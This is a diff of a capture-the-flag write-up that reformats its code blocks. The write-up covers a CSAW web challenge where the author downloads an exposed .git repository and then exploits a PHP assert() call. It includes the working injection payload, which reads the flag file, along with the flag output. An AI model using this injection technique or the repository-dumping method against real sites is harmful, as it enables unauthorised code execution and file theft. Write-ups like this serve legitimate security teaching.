@@ -98,7 +98,10 @@ The following table describes the possible respond pages:
 
 Looking at the source code i saw the following comment:
 
-<pre class="lang:php decode:true">&lt;!--&lt;li &gt;&lt;a href="?page=flag"&gt;My secrets&lt;/a&gt;&lt;/li&gt; --&gt;</pre>
+```php
+&lt;!--&lt;li &gt;&lt;a href="?page=flag"&gt;My secrets&lt;/a&gt;&lt;/li&gt; --&gt;
+```
+
 
 Ok, I need to get the &#8220;flag&#8221; page but any LFI technique I tried didn&#8217;t work. I thought about something else, In the &#8220;about&#8221; page the creator of the site mentioned that it was built using git. So let&#8217;s see if I am able to download the repository. The page http://web.chal.csaw.io:8000/.git/config exists so I downloaded the repository using <a href="https://github.com/kost/dvcs-ripper" target="_blank">DVCS-RIPPER</a>.
 
@@ -106,13 +109,19 @@ You can find index.php [here][1].
 
 So the page is using assert() which is vulnerable to Command Injection attack. After a little trial and error I came up with the answer:
 
-<pre class="lang:ps decode:true">(Invoke-WebRequest "http://web.chal.csaw.io:8000/?page=Megabeets') || var_dump(file_get_contents('templates/flag.php'));// Comment").Content</pre>
+```ps
+(Invoke-WebRequest "http://web.chal.csaw.io:8000/?page=Megabeets') || var_dump(file_get_contents('templates/flag.php'));// Comment").Content
+```
+
 
 And received the flag:
 
-<pre class="lang:php decode:true">string(52) "&lt;?php $FLAG="flag{3vald_@ss3rt_1s_best_a$$ert}"; ?&gt;
+```php
+string(52) "&lt;?php $FLAG="flag{3vald_@ss3rt_1s_best_a$$ert}"; ?&gt;
 "
-Detected hacking attempt!</pre>
+Detected hacking attempt!
+```
+
 
 If you try entering [the url][2] in a browser, look in the source of the page (CTRL+U), the flag is commented.
 
